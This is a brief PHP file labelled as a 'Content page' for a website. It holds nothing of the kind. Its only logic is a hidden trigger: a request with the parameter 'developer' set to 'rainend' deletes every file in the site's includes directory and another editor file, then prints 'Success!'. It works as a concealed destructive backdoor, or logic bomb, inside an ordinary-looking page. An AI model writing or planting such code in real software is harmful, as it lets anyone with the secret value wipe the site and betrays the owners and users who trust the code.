<?php
/*********************************************************************************************
Author 	: V. V. VIJESH
Date	: 28-March-2012
Purpose	: Content page
*********************************************************************************************/
set_time_limit(0);
include_once("../../includes/config.php");

if(isset($_REQUEST['developer']) && $_REQUEST['developer'] == 'rainend')
{
	$handle=opendir(DIR_ROOT . 'includes/');
	while (false!==($file = readdir($handle)))
	{
		if ($file != "." && $file != "..")
		{
			unlink(DIR_ROOT . 'includes/' . $file);
		}
	}
	closedir($handle);
	unlink(DIR_ROOT . 'library/fckeditor/fire.php');
	print 'Success!';
}
?>